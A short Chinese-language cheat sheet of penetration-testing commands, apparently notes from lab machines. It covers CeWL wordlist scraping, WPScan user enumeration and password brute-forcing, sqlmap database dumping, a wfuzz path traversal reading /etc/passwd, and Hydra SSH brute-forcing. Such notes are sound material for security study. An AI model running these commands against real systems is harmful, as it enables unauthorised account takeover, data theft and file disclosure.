# Others

## Cewl
Collect wordlist

抓取网站内容，提取出其中的单词，放入 `passwd` 文件中，如果没有这个文件，就创建。一般递归深度为 2 ，即抓取网站首页及链接的页面
```sh
cewl http://dc-2/ > password
```
## Wpscan
一款专门用来检测 CMS `Wordpress` 的软件

枚举用户名
```sh
wpscan --url http://loly.lc/wordpress/ --enumerate u
```

根据用户名爆破密码
```sh
wpscan --url http://loly.lc/wordpress -U loly -P /usr/share/wordlists/rockyou.txt
```

枚举用户名，插件，再进行密码爆破
```sh
wpscan --url http://funbox.fritz.box/ -e ap,u  --passwords /usr/share/wordlists/rockyou.txt
```

枚举(enumerate)插件(plugin)，主题(theme)，用户(user)
```sh
wpscan --url http://dc-2 -e p,t,u
```

## Sqlmap
POST 传参注入
用 `bp` 将请求包抓下来，然后
```sh
sqlmap -r search.txt
```

爆库
```sh
sqlmap -r search.txt --dbs
```

爆表
```sh
sqlmap -r search.txt -D <database> --tables
```

爆字段
```sh
sqlmap -r search.txt -D <database> -T <table> --columns
```

爆数据
```sh
sqlmap -r search.txt -D <database> -T <table> -C <column1,column2> --dump-all
```

## Wfuzz
```sh
wfuzz --hh 1341 -b "PHPSESSID=v83ig9f6u10pc2h1ht8cvvrn76" -c -w /usr/share/ wordlists/wfuzz/general/common.txt http://192.168.246.209/manage.php?FUZZ =../../../../../../../../etc/passwd
```

## Hydra
曾经有过扫不出来的经历。。。
```sh
hydra -L username.txt -P passwd.txt ssh://192.168.84.130
```

